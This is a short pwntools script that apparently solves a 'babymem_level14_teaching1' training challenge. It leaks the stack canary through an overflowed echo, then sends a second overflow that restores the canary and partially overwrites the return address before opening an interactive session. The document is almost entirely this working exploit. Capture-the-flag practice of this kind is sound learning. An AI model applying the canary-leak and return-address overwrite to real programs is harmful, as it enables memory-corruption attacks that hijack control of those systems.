#!/usr/bin/env python3

from pwn import *

# Create a process
p = process('/babymem_level14_teaching1')

# Send payload size
p.sendline(b"41")

# Send payload
p.send(b"REPEAT" + b"a" * 35)

# Retrieve stack canary
line = p.recvline_startswith(b"You said: ")
stack_canary = int.from_bytes(line[51:58], "little")
log.info("Stack canary: " + hex(stack_canary))

# Re-enter function again
# Send payload size
p.sendline(b"330")

# Send payload
p.send(b"a" * 312 + p64(stack_canary * 256) + b"a" * 8 + p16(0x2222))
p.interactive()
